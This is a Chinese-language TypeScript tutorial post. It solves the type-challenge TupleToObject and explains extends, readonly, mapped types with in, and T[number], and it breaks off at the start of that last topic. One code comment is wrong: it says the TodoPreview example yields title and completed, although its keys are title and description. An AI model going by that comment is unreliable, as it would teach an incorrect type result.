            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3702810892856808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    fxss
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:20:03.000Z" title="Fri Jan 30 2026 15:20:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">11 - 元组转换为对象</h2>
<p>by sinoon (@sinoon) #简单 #object-keys</p>
<h3 data-id="heading-1">题目</h3>
<p>将一个元组类型转换为对象类型，这个对象类型的键/值和元组中的元素对应。</p>
<p>例如：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> tuple = [<span class="hljs-string">'tesla'</span>, <span class="hljs-string">'model 3'</span>, <span class="hljs-string">'model X'</span>, <span class="hljs-string">'model Y'</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>

<span class="hljs-keyword">type</span> result = <span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tuple&gt; <span class="hljs-comment">// expected { 'tesla': 'tesla', 'model 3': 'model 3', 'model X': 'model X', 'model Y': 'model Y'}</span>
</code></pre>
<blockquote>
<p>在 Github 上查看：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F11%2Fzh-CN" target="_blank" title="https://tsch.js.org/11/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/11/zh-CN</a></p>
</blockquote>
<h3 data-id="heading-2">代码</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ 你的代码 _____________ */</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TupleToObject</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-title class_">PropertyKey</span>[]&gt; = {
  [P <span class="hljs-keyword">in</span> T[<span class="hljs-built_in">number</span>]]: P
}

</code></pre>
<p>关键解释：</p>
<ul>
<li><code>type PropertyKey = string | number | symbol</code>。</li>
<li><code>T extends readonly PropertyKey[]</code> 用于限制 <code>T</code> 必须是一个只读的属性键元组。</li>
<li><code>[P in T[number]]</code> 用于遍历元组中的每个元素，将其作为对象的键。</li>
<li><code>P</code> 是元组中的元素类型，通过 <code>T[number]</code> 来获取。</li>
</ul>
<h3 data-id="heading-3">相关知识点</h3>
<h4 data-id="heading-4"><code>extends</code></h4>




















<table><thead><tr><th>使用维度</th><th>核心作用</th><th>示例场景</th></tr></thead><tbody><tr><td>类型维度</td><td>做类型约束或条件判断（类型编程核心）</td><td>限定泛型范围、判断类型是否兼容、提取类型片段</td></tr><tr><td>语法维度</td><td>做继承（复用已有结构）</td><td>接口继承、类继承</td></tr></tbody></table>
<h5 data-id="heading-5"><code>extends</code> 做类型约束或条件判断</h5>
<ol>
<li>泛型约束：限定泛型的取值范围</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 约束 T 必须是「拥有 length 属性」的类型（比如 string/数组）</span>
<span class="hljs-keyword">function</span> getLength&lt;T <span class="hljs-keyword">extends</span> { <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span> }&gt;(<span class="hljs-attr">arg</span>: T): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> arg.<span class="hljs-property">length</span>;
}

<span class="hljs-comment">// 合法调用（符合约束）</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-string">"hello"</span>); <span class="hljs-comment">// ✅ string 有 length，返回 5</span>
<span class="hljs-title function_">getLength</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// ✅ 数组有 length，返回 3</span>

<span class="hljs-comment">// 非法调用（超出约束）</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// ❌ 报错：number 没有 length 属性</span>
</code></pre>
<ol start="2">
<li>条件类型：类型版 <strong>三元运算符</strong></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 基础示例：判断类型是否为字符串</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">IsString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-string">"test"</span>&gt;; <span class="hljs-comment">// true（符合）</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-number">123</span>&gt;; <span class="hljs-comment">// false（不符合）</span>
</code></pre>
<p>分布式条件类型（联合类型专用）: 当 <code>T</code> 是联合类型时，<code>extends</code> 会自动拆分联合类型的每个成员，逐个判断后再合并结果。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Union</span> = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> | <span class="hljs-built_in">boolean</span>;

<span class="hljs-comment">// 拆分逻辑：string→string，number→never，boolean→never → 合并为 string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">OnlyString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">OnlyString</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// Result = string</span>
</code></pre>
<p>注意：只有泛型参数是 裸类型（没有被 []/{} 包裹）时，才会触发分布式判断：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 包裹后不触发分布式，整体判断 [string|number] 是否兼容 [string]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NoDist</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">string</span>] ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result2</span> = <span class="hljs-title class_">NoDist</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// never（整体不兼容）</span>
</code></pre>
<ol start="3">
<li>配合 <code>infer</code>：提取类型片段（黄金组合）</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 提取 Promise 的返回值类型</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer V&gt; ? V : T;

<span class="hljs-keyword">type</span> C = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// string（提取成功）</span>
<span class="hljs-keyword">type</span> D = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-built_in">number</span>&gt;; <span class="hljs-comment">// number（不满足条件，返回原类型）</span>
</code></pre>
<h5 data-id="heading-6"><code>extends</code> 做继承（复用已有结构）</h5>
<ol>
<li>接口继承：复用 + 扩展属性</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 基础接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// 继承 User，并扩展新属性</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span> | <span class="hljs-string">"super_admin"</span>; <span class="hljs-comment">// 新增权限属性</span>
}

<span class="hljs-comment">// 必须包含继承的 + 扩展的所有属性</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">admin</span>: <span class="hljs-title class_">Admin</span> = {
  <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">"张三"</span>,
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span>
};

<span class="hljs-comment">// 多接口继承</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HasAge</span> { <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>; }
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span>, <span class="hljs-title class_">HasAge</span> {
  <span class="hljs-attr">className</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 同时继承 User + HasAge</span>
}
</code></pre>
<ol start="2">
<li>类继承：复用父类的属性 / 方法</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
}

<span class="hljs-comment">// 继承 Parent 类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> {
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// 必须调用父类构造函数（初始化父类属性）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
  <span class="hljs-comment">// 重写父类方法</span>
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 调用父类原方法</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old`</span>);
  }
}

<span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">"李四"</span>, <span class="hljs-number">10</span>);
child.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 输出：Hi, 李四 → I'm 10 years old</span>
</code></pre>
<p>补充：类实现接口用 <code>implements</code>（不是 <code>extends</code>）</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义接口（契约：规定必须有 id、name 属性，以及 greet 方法）</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">greet</span>(): <span class="hljs-built_in">void</span>; <span class="hljs-comment">// 仅定义方法签名，无实现</span>
}

<span class="hljs-comment">// 类实现接口（必须严格遵守契约）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-comment">// 必须实现接口的所有属性</span>
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-comment">// 构造函数初始化属性</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// 必须实现接口的 greet 方法（具体实现由类自己定义）</span>
  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.id}</span>`</span>);
  }
}

<span class="hljs-comment">// 实例化使用</span>
<span class="hljs-keyword">const</span> emp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"张三"</span>);
emp.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// 输出：Hi, I'm 张三, ID: 1</span>


<span class="hljs-comment">// 接口1：基础信息</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Identifiable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// 接口2：可打印</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Printable</span> {
  <span class="hljs-title function_">printInfo</span>(): <span class="hljs-built_in">void</span>;
}

<span class="hljs-comment">// 类同时实现两个接口（必须实现所有接口的成员）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Identifiable</span>, <span class="hljs-title class_">Printable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 类可扩展接口外的属性</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// 实现 Identifiable 的方法</span>
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>;
  }

  <span class="hljs-comment">// 实现 Printable 的方法</span>
  <span class="hljs-title function_">printInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Product: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getId()}</span>`</span>);
  }
}

<span class="hljs-keyword">const</span> product = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(<span class="hljs-number">100</span>, <span class="hljs-string">"手机"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(product.<span class="hljs-title function_">getId</span>()); <span class="hljs-comment">// 100</span>
product.<span class="hljs-title function_">printInfo</span>(); <span class="hljs-comment">// Product: 手机, ID: 100</span>
</code></pre>
<h4 data-id="heading-7"><code>readonly</code></h4>
<ul>
<li>核心作用：标记后，目标（属性 / 数组 / 元组）只能在初始化阶段赋值（比如接口实例化、类构造函数、变量声明时），后续任何修改运算都会被 TS 编译器拦截报错；</li>
<li>运行时特性：<code>readonly</code> 仅做编译时检查，不会生成任何额外 JS 代码，也无法真正阻止运行时的修改（比如通过类型断言绕开的话，运行时仍能改）；</li>
<li>与 <code>const</code> 的区别：<code>const</code> 是变量层面的不可重新赋值（但变量指向的对象 / 数组内部属性仍可改），<code>readonly</code> 是属性 / 类型层面的不可修改（变量本身可重新赋值，除非变量也用 <code>const</code>）。</li>
</ul>
<p>常用使用场景：</p>
<ol>
<li>作用于接口 / 类型别名的属性（最基础）</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义带只读属性的接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// 只读属性：只能初始化赋值，后续不可改</span>
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 普通属性：可修改</span>
}

<span class="hljs-comment">// 初始化时赋值（合法）</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> = { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"张三"</span> };

<span class="hljs-comment">// 尝试修改只读属性（报错）</span>
user.<span class="hljs-property">id</span> = <span class="hljs-number">2</span>; <span class="hljs-comment">// ❌ 报错：无法分配到 "id"，因为它是只读属性</span>
<span class="hljs-comment">// 修改普通属性（合法）</span>
user.<span class="hljs-property">name</span> = <span class="hljs-string">"李四"</span>; <span class="hljs-comment">// ✅ 合法</span>
</code></pre>
<ol start="2">
<li>作用于类的属性: 类中使用 <code>readonly</code> 标记属性，只能在<strong>声明时</strong>或<strong>构造函数中</strong>赋值，后续无法修改</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// 只读属性</span>
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-comment">// 构造函数中给 readonly 属性赋值（唯一合法的后续赋值方式）</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-title function_">updateInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = <span class="hljs-number">100</span>; <span class="hljs-comment">// ❌ 报错：id 是只读属性</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">"王五"</span>; <span class="hljs-comment">// ✅ 合法</span>
  }
}

<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"赵六"</span>);
person.<span class="hljs-property">id</span> = <span class="hljs-number">2</span>; <span class="hljs-comment">// ❌ 报错：只读属性不可修改</span>
</code></pre>
<ol start="3">
<li>作用于数组 / 元组（只读数组）: <code>readonly</code> 可标记数组为 “只读数组”，禁止修改数组元素、调用 <code>push/pop</code> 等修改方法</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 方式1：使用 readonly 修饰数组类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">arr1</span>: <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
arr1.<span class="hljs-title function_">push</span>(<span class="hljs-number">4</span>); <span class="hljs-comment">// ❌ 报错：readonly 数组不存在 push 方法</span>
arr1[<span class="hljs-number">0</span>] = <span class="hljs-number">10</span>; <span class="hljs-comment">// ❌ 报错：无法修改只读数组的元素</span>

<span class="hljs-comment">// 方式2：使用 ReadonlyArray&lt;T&gt; 类型（等价于 readonly T[]）</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">arr2</span>: <span class="hljs-title class_">ReadonlyArray</span>&lt;<span class="hljs-built_in">string</span>&gt; = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>];
arr2.<span class="hljs-title function_">pop</span>(); <span class="hljs-comment">// ❌ 报错</span>

<span class="hljs-comment">// 作用于元组（只读元组）</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Point</span> = <span class="hljs-keyword">readonly</span> [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>];
<span class="hljs-keyword">const</span> <span class="hljs-attr">point</span>: <span class="hljs-title class_">Point</span> = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>];
point[<span class="hljs-number">0</span>] = <span class="hljs-number">30</span>; <span class="hljs-comment">// ❌ 报错：只读元组元素不可修改</span>
</code></pre>
<ol start="4">
<li>结合 <code>keyof</code> + <code>in</code> 批量创建只读类型（映射类型）</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Product</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">price</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">stock</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// 批量创建只读版本的 Product（TS 内置的 Readonly&lt;T&gt; 就是这么实现的）</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ReadonlyProduct</span> = {
  <span class="hljs-keyword">readonly</span> [K <span class="hljs-keyword">in</span> keyof <span class="hljs-title class_">Product</span>]: <span class="hljs-title class_">Product</span>[K];
};

<span class="hljs-keyword">const</span> <span class="hljs-attr">product</span>: <span class="hljs-title class_">ReadonlyProduct</span> = { <span class="hljs-attr">name</span>: <span class="hljs-string">"手机"</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">2999</span>, <span class="hljs-attr">stock</span>: <span class="hljs-number">100</span> };
product.<span class="hljs-property">price</span> = <span class="hljs-number">3999</span>; <span class="hljs-comment">// ❌ 报错：price 是只读属性</span>

<span class="hljs-comment">// TS 内置了 Readonly&lt;T&gt;，可直接使用（无需手动写映射类型）</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">product2</span>: <span class="hljs-title class_">Readonly</span>&lt;<span class="hljs-title class_">Product</span>&gt; = { <span class="hljs-attr">name</span>: <span class="hljs-string">"电脑"</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">5999</span>, <span class="hljs-attr">stock</span>: <span class="hljs-number">50</span> };
product2.<span class="hljs-property">stock</span> = <span class="hljs-number">60</span>; <span class="hljs-comment">// ❌ 报错</span>
</code></pre>
<ol start="5">
<li>只读索引签名：如果类型使用索引签名，也可以标记为 <code>readonly</code>，禁止通过索引修改属性</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 只读索引签名：只能读取，不能修改</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">ReadonlyDict</span> = {
  <span class="hljs-keyword">readonly</span> [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">number</span>;
};

<span class="hljs-keyword">const</span> <span class="hljs-attr">dict</span>: <span class="hljs-title class_">ReadonlyDict</span> = { <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: <span class="hljs-number">2</span> };
dict[<span class="hljs-string">"a"</span>] = <span class="hljs-number">3</span>; <span class="hljs-comment">// ❌ 报错：索引签名是只读的</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dict[<span class="hljs-string">"b"</span>]); <span class="hljs-comment">// ✅ 合法：仅读取</span>
</code></pre>
<h4 data-id="heading-8"><code>in</code></h4>
<p><code>in</code> 运算符用于遍历联合类型中的每个成员，将其转换为映射类型的属性名。</p>
<p>例如：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Todo</span> {
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">description</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">completed</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoKeys</span> = <span class="hljs-string">'title'</span> | <span class="hljs-string">'description'</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TodoPreview</span> = {
  [P <span class="hljs-keyword">in</span> <span class="hljs-title class_">TodoKeys</span>]: <span class="hljs-title class_">Todo</span>[P]
}
<span class="hljs-comment">// TodoPreview 类型为：</span>
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   title: string</span>
<span class="hljs-comment">//   completed: boolean</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h4 data-id="heading-9"><code>T[number]</code></h4>
<p><code>T[number]</code> 索引访问类型 用于 从数组类型 / 元组类型中提取所有元素的类型，最终得到一个联合类型。</p>
<ol>
<li>普通数组类型</li>
</ol>
